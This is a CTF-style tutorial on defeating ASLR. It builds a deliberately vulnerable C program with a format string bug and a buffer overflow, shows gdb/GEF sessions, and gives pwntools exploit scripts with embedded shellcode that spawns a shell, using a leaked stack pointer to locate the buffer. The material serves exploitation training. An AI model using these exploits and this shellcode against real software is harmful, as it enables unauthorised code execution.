<h1 align="center">PWN 301</h1>
  <p align="center">
  Address Space Layout Randomization (ASLR)
  </p>

### Table of contents

- [Introduction](#introduction)
- [Brute Forcing Addresses](#brute-forcing-addresses)
- [Offsets](#offsets)
- [Buffer Overflow Without ASLR](#buffer-overflow-without-aslr)
- [Bypassing ASLR](#bypassing-aslr)
- [More Resources](#more-resources)
- [Creators](#creators)

## Introduction

[Address Space Layout Randomization (ASLR)](https://en.wikipedia.org/wiki/Address_space_layout_randomization) is an exploit mitigation technology that causes the Operating System to randomize the location of where certain areas of code are loaded at runtime. The base of the executable (which is where the binary is first loaded in memory), any libraries the binary uses, the stack, and the heap will all be loaded at a different address every time you run the program when ASLR is enabled. ASLR prevents us from using hardcoded addresses in our exploits, which makes it more difficult to do buffer overflows.

## Brute Forcing Addresses

Sometimes, especially in 32-bit programs, you'll find bad implementations of ASLR where the addresses are not very random. Usually, in these cases, the addresses might only differ by a single byte or two every time the program is executed. If you're dealing with such a scenario, then you can try a brute-force approach where you guess every possible address. However, brute forcing the address is infeasible if the address space is implemented correctly. It also might cause the target to crash many times before you obtain the right address, which you probably do not want to do if you care about stealth. There is a far superior method for defeating ASLR that involves using memory leaks to our advantage.

## Offsets

One thing that you should keep in mind is that offsets for variables will usually remain the same if they are in the same memory mapping. Randomizing the addresses of every single variable would take an incredibly long time, so instead the OS will just randomize the starting address of memory mappings. In other words, if one variable on the stack is located 56 bytes away from another variable on the stack, then chances are that it will remain 56 bytes away from that variable even if ASLR is turned on. Note that this does not necessarily hold true for two variables that are in different memory mappings (i.e. if one variable on the stack is 0x10000000 bytes away from a variable on the heap during one instance of execution, then there is a far greater chance of that offset being changed in subsequent instances of the program).

Suppose we were able to somehow leak the address of a pointer on the stack using something like a format string vulnerability. We could then use this pointer to calculate the address of other things on the stack, such as the address of our shellcode or anything else that we might need to know in order to exploit the target. Because the offsets of variables in the same memory mapping will seldom change, we can be assured that our exploit will work most of the time.

In some situations, we might be able to simply leak the address that we need from the stack without even needing to add or subtract an offset from it. Let's take a look at one such example.

## Buffer Overflow Without ASLR

The `vulns()` function in the following code segment contains two vulnerabilities: a format string vulnerability followed by a buffer overflow.

```c
#include <stdio.h>
#include <stdlib.h>

void vulns(char buf[50]) {
    printf("Format string vuln: ");
    fgets(buf, 50, stdin);
    printf(buf);
    printf("Buffer overflow: ");
    fgets(buf, 500, stdin);
}

int main(int argc, char **argv) {
    char buf[50];
    vulns(buf);
    return 0;
}
```

We can figure out the correct offset of the return address using `cyclic`.

```sh
$ cyclic 500
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae

$ gdb aslr
GNU gdb (Debian 10.1-1.4) 10.1
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
77 commands loaded for GDB 10.1 using Python engine 3.9
[*] 3 commands could not be loaded, run `gef missing` to know why.
Reading symbols from aslr...
(No debugging symbols found in aslr)
gef➤  run
Starting program: /home/nihaal/Desktop/ctf-courses/Pwn/PWN 301/aslr
Format string vuln: ignorethis
ignorethis
Buffer overflow: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae

Program received signal SIGSEGV, Segmentation fault.
0x00005555555551d8 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0
$rbx   : 0x0
$rcx   : 0x00005555555596f0  →  "qaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabda[...]"
$rdx   : 0x0
$rsp   : 0x00007fffffffdfc8  →  "saaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfa[...]"
$rbp   : 0x6161617261616171 ("qaaaraaa"?)
$rsi   : 0x00005555555596b1  →  "aaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaa[...]"
$rdi   : 0x00007ffff7fb0680  →  0x0000000000000000
$rip   : 0x00005555555551d8  →  <main+33> ret
$r8    : 0x00007fffffffdf80  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$r9    : 0x00007fffffffdfc0  →  "qaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabda[...]"
$r10   : 0x0000555555556019  →  "Buffer overflow: "
$r11   : 0x00007fffffffe153  →  "eraaesaaetaaeuaaevaaewaaexaaeyaa"
$r12   : 0x0000555555555060  →  <_start+0> xor ebp, ebp
$r13   : 0x0
$r14   : 0x0
$r15   : 0x0
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdfc8│+0x0000: "saaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfa[...]"    ← $rsp
0x00007fffffffdfd0│+0x0008: "uaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabha[...]"
0x00007fffffffdfd8│+0x0010: "waaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabja[...]"
0x00007fffffffdfe0│+0x0018: "yaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaabla[...]"
0x00007fffffffdfe8│+0x0020: "baabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabna[...]"
0x00007fffffffdff0│+0x0028: "daabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpa[...]"
0x00007fffffffdff8│+0x0030: "faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabra[...]"
0x00007fffffffe000│+0x0038: "haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabta[...]"
──────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555555551cd <main+22>        call   0x555555555145 <vulns>
   0x5555555551d2 <main+27>        mov    eax, 0x0
   0x5555555551d7 <main+32>        leave
 → 0x5555555551d8 <main+33>        ret
[!] Cannot disassemble from $PC
──────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "aslr", stopped 0x5555555551d8 in main (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5555555551d8 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  q

$ cyclic -l saaa
72
```

Below is the script that exploits the target when ASLR is disabled. Note that it uses a hardcoded address, which you will have to change if you want it to work on your machine. You can figure out the address of the buffer yourself by doing the following steps (not shown in the code snippet):
1. Call `gdb.attach()` right after opening up the process.
2. Setup a breakpoint right after the first call to `fgets()`.
3. Type in a bunch of A's.
4. Look at the stack where those A's begin to appear. That address is the starting address of the buffer.

```python
#!/usr/bin/env python3
from pwn import *

# Open up the process
p = process("./aslr", stdin=PTY)

# Read until we hit the ": " character at the end of the prompt
# Can't use p.readline() b/c there's no "\n" character at the end of the first prompt
p.readuntil(": ")

# Ignore the format string vulnerability for now
p.sendline("")

# Hardcoded address of shellcode
addr = p64(0x7fffffffdff0 + 80)

# Generate the payload
shellcode = b'\x66\x81\xec\x2c\x01\x48\x31\xc0\x48\x31\xff\xb0\x03\x0f\x05\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x48\x31\xc0\xb0\x3b\x48\x31\xdb\x53\xbb\x6e\x2f\x73\x68\x48\xc1\xe3\x10\x66\xbb\x62\x69\x48\xc1\xe3\x10\xb7\x2f\x53\x48\x89\xe7\x48\x83\xc7\x01\x48\x31\xf6\x48\x31\xd2\x0f\x05'
useless = b'A' * 72
payload = useless + addr + shellcode

# Exploit the buffer overflow
p.sendline(payload)
p.interactive()
```

This exploit is slightly different than some of our other buffer overflows. We know that the return address comes 72 bytes after the start of our buffer. However, `len(shellcode)` is equal to 83, which means that if we type out our shellcode first, our shellcode will overwrite the return address before we can overwrite it with the correct address. To get around this, we'll put the shellcode AFTER the return address (instead of before). This means that all we have to do is put 72 bytes of junk beforehand, overwrite the return address with the address of the shellcode, and insert the shellcode after the overwritten return address. This also means that we'll have to add 80 bytes (72 bytes of junk plus the return address) to the base address of the buffer instead of just using it directly.

```sh
$ ./noaslr.py
[+] Starting local process './aslr': pid 3490
[*] Switching to interactive mode

$ $ echo "Worked without ASLR."
Worked without ASLR.
$ $
```

## Bypassing ASLR

With ASLR turned on, let's print off some pointers from the stack.

```sh
$ ./aslr
Format string vuln: %p.%p.%p.%p.%p.%p.%p.%p.
0x55e6b6b536b1.(nil).0x55e6b6b536c9.0x7ffe55603980.0x7f7544fb7be0.(nil).0x7ffe55603980.0x7ffe556039c0.
Buffer overflow: AAAAAAAAAAA
```

At first glance, none of these pointers seem interesting. However, if we print out the pointers inside of a debugger, we'll notice that the fourth pointer that was printed out is always equal to the beginning of the buffer.

```sh
$ gdb aslr
GNU gdb (Debian 10.1-1.4) 10.1
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
77 commands loaded for GDB 10.1 using Python engine 3.9
[*] 3 commands could not be loaded, run `gef missing` to know why.
Reading symbols from aslr...
(No debugging symbols found in aslr)
gef➤  disas vulns
Dump of assembler code for function vulns:
   0x0000000000001145 <+0>:     push   rbp
   0x0000000000001146 <+1>:     mov    rbp,rsp
   0x0000000000001149 <+4>:     sub    rsp,0x10
   0x000000000000114d <+8>:     mov    QWORD PTR [rbp-0x8],rdi
   0x0000000000001151 <+12>:    lea    rdi,[rip+0xeac]        # 0x2004
   0x0000000000001158 <+19>:    mov    eax,0x0
   0x000000000000115d <+24>:    call   0x1030 <printf@plt>
   0x0000000000001162 <+29>:    mov    rdx,QWORD PTR [rip+0x2ed7]        # 0x4040 <stdin@@GLIBC_2.2.5>
   0x0000000000001169 <+36>:    mov    rax,QWORD PTR [rbp-0x8]
   0x000000000000116d <+40>:    mov    esi,0x32
   0x0000000000001172 <+45>:    mov    rdi,rax
   0x0000000000001175 <+48>:    call   0x1040 <fgets@plt>
   0x000000000000117a <+53>:    mov    rax,QWORD PTR [rbp-0x8]
   0x000000000000117e <+57>:    mov    rdi,rax
   0x0000000000001181 <+60>:    mov    eax,0x0
   0x0000000000001186 <+65>:    call   0x1030 <printf@plt>
   0x000000000000118b <+70>:    lea    rdi,[rip+0xe87]        # 0x2019
   0x0000000000001192 <+77>:    mov    eax,0x0
   0x0000000000001197 <+82>:    call   0x1030 <printf@plt>
   0x000000000000119c <+87>:    mov    rdx,QWORD PTR [rip+0x2e9d]        # 0x4040 <stdin@@GLIBC_2.2.5>
   0x00000000000011a3 <+94>:    mov    rax,QWORD PTR [rbp-0x8]
   0x00000000000011a7 <+98>:    mov    esi,0x1f4
   0x00000000000011ac <+103>:   mov    rdi,rax
   0x00000000000011af <+106>:   call   0x1040 <fgets@plt>
   0x00000000000011b4 <+111>:   nop
   0x00000000000011b5 <+112>:   leave
   0x00000000000011b6 <+113>:   ret
End of assembler dump.
gef➤  b *vulns+113
Breakpoint 1 at 0x11b6
gef➤  run
Starting program: /home/nihaal/Desktop/ctf-courses/Pwn/PWN 301/aslr
Format string vuln: %4$p
0x7fffffffdf80
Buffer overflow: AAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x00005555555551b6 in vulns ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffdf80  →  "AAAAAAAAAAAAAAAAAAAAAA\n"
$rbx   : 0x0
$rcx   : 0x00005555555596c7  →  0x0000000000000000
$rdx   : 0x0
$rsp   : 0x00007fffffffdf68  →  0x00005555555551d2  →  <main+27> mov eax, 0x0
$rbp   : 0x00007fffffffdfc0  →  0x00005555555551e0  →  <__libc_csu_init+0> push r15
$rsi   : 0x00005555555596b1  →  "AAAAAAAAAAAAAAAAAAAAA\n"
$rdi   : 0x00007ffff7fb0680  →  0x0000000000000000
$rip   : 0x00005555555551b6  →  <vulns+113> ret
$r8    : 0x00007fffffffdf80  →  "AAAAAAAAAAAAAAAAAAAAAA\n"
$r9    : 0x0
$r10   : 0x0000555555556019  →  "Buffer overflow: "
$r11   : 0x246
$r12   : 0x0000555555555060  →  <_start+0> xor ebp, ebp
$r13   : 0x0
$r14   : 0x0
$r15   : 0x0
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf68│+0x0000: 0x00005555555551d2  →  <main+27> mov eax, 0x0        ← $rsp
0x00007fffffffdf70│+0x0008: 0x00007fffffffe0b8  →  0x00007fffffffe3c0  →  "/home/nihaal/Desktop/ctf-courses/Pwn/PWN 301/aslr"
0x00007fffffffdf78│+0x0010: 0x00000001000000c2
0x00007fffffffdf80│+0x0018: "AAAAAAAAAAAAAAAAAAAAAA\n"   ← $rax, $r8
0x00007fffffffdf88│+0x0020: "AAAAAAAAAAAAAA\n"
0x00007fffffffdf90│+0x0028: "AAAAAA\n"
0x00007fffffffdf98│+0x0030: 0x0000000000000000
0x00007fffffffdfa0│+0x0038: 0x00005555555551e0  →  <__libc_csu_init+0> push r15
──────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555555551af <vulns+106>      call   0x555555555040 <fgets@plt>
   0x5555555551b4 <vulns+111>      nop
   0x5555555551b5 <vulns+112>      leave
 → 0x5555555551b6 <vulns+113>      ret
   ↳  0x5555555551d2 <main+27>        mov    eax, 0x0
      0x5555555551d7 <main+32>        leave
      0x5555555551d8 <main+33>        ret
      0x5555555551d9                  nop    DWORD PTR [rax+0x0]
      0x5555555551e0 <__libc_csu_init+0> push   r15
      0x5555555551e2 <__libc_csu_init+2> lea    r15, [rip+0x2bff]        # 0x555555557de8
──────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "aslr", stopped 0x5555555551b6 in vulns (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5555555551b6 → vulns()
[#1] 0x5555555551d2 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

In this instance, when we sent the target "%4$p" as input, we obtained the address `0x7fffffffdf80`. If we look at the stack at `vulns+113`, we can see that the address `0x00007fffffffdf80` contains a bunch of A's, which was our input for the second call to `fgets()`. This shows that the fourth value printed out always points to the address of the buffer even when ASLR is enabled.

Note that in some challenges, you might not have a value on the stack that is directly equal to the value of the address of the buffer. In these situations, you will have to have to find a pointer that is in the same memory mapping as the buffer and add/subtract an offset to/from it in order to obtain the address of the buffer. You can use the `vmmap` command in GEF to look at the virtual memory mappings.

```python
#!/usr/bin/env python3
from pwn import *

# Open up the process
p = process("./aslr", stdin=PTY)

# Read the prompt
p.readuntil(": ")

# Exploit the format string vulnerability
p.sendline("%4$p")

# Obtain the address of the buffer
addr = p.readline()
addr = int(addr, 16) + 80
addr = p64(addr)

# Generate the payload
shellcode = b'\x66\x81\xec\x2c\x01\x48\x31\xc0\x48\x31\xff\xb0\x03\x0f\x05\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x48\x31\xc0\xb0\x3b\x48\x31\xdb\x53\xbb\x6e\x2f\x73\x68\x48\xc1\xe3\x10\x66\xbb\x62\x69\x48\xc1\xe3\x10\xb7\x2f\x53\x48\x89\xe7\x48\x83\xc7\x01\x48\x31\xf6\x48\x31\xd2\x0f\x05'
useless = b'A' * 72
payload = useless + addr + shellcode

# Exploit the buffer overflow
p.sendline(payload)
p.interactive()
```

We have modified the exploit so that it works even when ASLR is enabled. It will first exploit the format string vulnerability in order to leak the address of the beginning of the buffer. Then it will add 80 bytes to that address in order to obtain the address of the shellcode.

```sh
$ echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
2

$ ./exploit.py      
[+] Starting local process './aslr': pid 3808
[*] Switching to interactive mode
Buffer overflow: $ $ echo "Worked with ASLR!"
Worked with ASLR!
$ $ 
```

## More Resources:

## Creators

**Nihaal Prasad**

Enjoy :metal:
